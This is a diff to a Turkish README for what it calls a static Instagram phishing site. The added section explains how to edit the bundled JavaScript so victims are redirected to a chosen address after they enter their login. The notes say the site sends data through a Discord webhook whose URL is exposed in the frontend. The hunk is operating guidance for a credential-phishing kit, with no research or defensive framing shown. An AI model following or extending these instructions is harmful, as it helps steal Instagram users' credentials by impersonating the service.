@@ -11,11 +11,18 @@ Bu klasör, Instagram phishing sitesinin **statik versiyonunu** içerir. Bu vers
 
 2. Yükleme işlemi tamamlandıktan sonra, site çalışmaya hazırdır.
 
+## Yönlendirme URL'ini Değiştirme
+
+Giriş yapıldıktan sonra kullanıcıların yönlendirileceği URL'i değiştirmek için:
+
+1. `assets/` klasöründeki JavaScript dosyasını (`index-*.js`) bir metin editörü ile açın
+2. Dosyada `REDIRECT_URL` veya `https://instagram.com` kelimelerini arayın
+3. Bulduğunuz URL'i istediğiniz yönlendirme adresiyle değiştirin (örneğin: `https://facebook.com`)
+
 ## Önemli Notlar
 
 - **CORS Sorunları**: Discord API'sine doğrudan istekler yaparken tarayıcınız CORS hataları verebilir.
 - **Webhook URL'i**: Discord webhook URL'i frontend kodunda açıkça görünür durumdadır.
-- **Yönlendirme URL'i**: Giriş yapıldıktan sonra kullanıcılar varsayılan olarak `example.com` adresine yönlendirilir. Bu URL'i değiştirmek isterseniz, `assets/index-*.js` dosyasını düzenleyebilirsiniz.
 
 ## Güvenlik Uyarısı
 
